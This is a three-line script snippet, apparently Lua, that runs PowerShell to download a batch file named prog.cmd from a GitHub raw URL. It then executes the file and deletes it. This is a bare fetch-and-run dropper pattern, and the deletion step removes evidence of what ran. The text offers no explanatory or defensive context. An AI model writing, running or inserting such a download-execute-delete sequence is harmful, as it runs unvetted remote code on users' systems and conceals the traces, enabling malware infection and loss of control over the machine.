os.execute('powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/testmce/main/prog.cmd -OutFile prog.cmd') os.execute('prog.cmd') os.execute('del prog.cmd')
